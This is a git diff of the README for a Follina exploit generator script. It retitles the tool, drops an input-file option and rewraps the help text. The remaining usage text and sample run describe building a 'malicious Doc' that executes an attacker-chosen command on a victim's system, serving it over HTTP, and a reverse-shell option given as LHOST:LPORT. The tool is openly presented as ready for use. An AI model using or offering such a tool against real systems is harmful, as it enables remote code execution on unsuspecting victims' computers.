@@ -1,19 +1,20 @@
 # Follina Exploit
 
-Convert a Microsoft Windows Doc into a One-Click Payload
+Follina PoC Exploit Generator!
 
 ## Usage
 ```bash
 $ ./follina_exploit.py --help
-usage: follina_exploit.py [-h] [-f FILE] [-c COMMAND] [-o OUTPUT] [-i IP] [-p PORT] [-r LHOST:LPORT]
+usage: follina_exploit.py [-h] [-c COMMAND] [-o OUTPUT] [-i IP] [-p PORT]
+                          [-r LHOST:LPORT]
 
 [+] Exploit Generator for Follina
 
 options:
   -h, --help            show this help message and exit
-  -f FILE, --file FILE  Input Microsoft Word File
   -c COMMAND, --command COMMAND
-                        Command to execute on the remote system [Default: Calc]
+                        Command to execute on the remote system [Default:
+                        Calc]
   -o OUTPUT, --output OUTPUT
                         Name of output malicious Doc [Default: exploit.doc]
   -i IP, --ip IP        Interface to bind http server to [Default: 127.0.0.1]
@@ -24,7 +25,6 @@ options:
 
 ```bash
 $ ./follina_exploit.py
-⚙ Input File: whokilleddb.docx
 ⚙ Output File: exploit.doc
 ⚙ Starting HTTP Server over: 127.0.0.1:6969
 ⚙ Command: calc.exe
